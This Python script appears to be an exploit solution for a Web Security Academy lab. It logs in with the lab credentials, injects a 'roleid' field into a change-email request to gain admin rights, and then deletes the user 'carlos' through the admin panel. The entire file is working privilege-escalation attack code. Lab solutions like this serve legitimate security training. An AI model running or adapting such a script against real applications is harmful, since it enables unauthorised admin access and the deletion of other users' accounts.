import requests
import sys



def login(url, session):
    response = session.post(f"{url}/login", data={"username": "wiener", "password": "peter"}, timeout=10)
    return "Your username is: wiener" in response.text


def change_user_role(url, session):
    response = session.post(f"{url}/my-account/change-email", data='{"email": "email@email.com", "roleid": 2}', timeout=10)
    return "Admin panel" in response.text


def delete_user(url, session):
    response = session.get(f"{url}/admin/delete?username=carlos", timeout=10)
    return "User deleted successfully!" in response.text


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python3 {sys.argv[0]} <URL>")
        print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
        sys.exit(1)

    try:
        url = sys.argv[1].rstrip("/")
        session = requests.Session()
        session.mount("https://", requests.adapters.HTTPAdapter(max_retries=requests.adapters.Retry(total=3, backoff_factor=0.1)))

        print("(+) Logging in...")
        if not login(url, session):
            print("(-) Something went wrong. Please check your URL and try again.")
            sys.exit(1)

        print("(+) Changing user role....")
        if not change_user_role(url, session):
            print("(-) Something went wrong. Please try again.")
            sys.exit(1)

        print("(+) Deleting the user \"carlos\"...")
        if delete_user(url, session):
            print("(+) Successfully deleted the user \"carlos\"!")
        else:
            print("(-) Something went wrong. Please try again.")


    except requests.exceptions.Timeout:
        print("(-) Request timed out.")

    except requests.exceptions.MissingSchema:
        print("(-) Please enter a valid URL.")

    except requests.exceptions.ConnectionError:
        print("(-) Unable to connect to host. Please check your URL and try again.")

    except KeyboardInterrupt:
        sys.exit(1)


if __name__ == "__main__":
    main()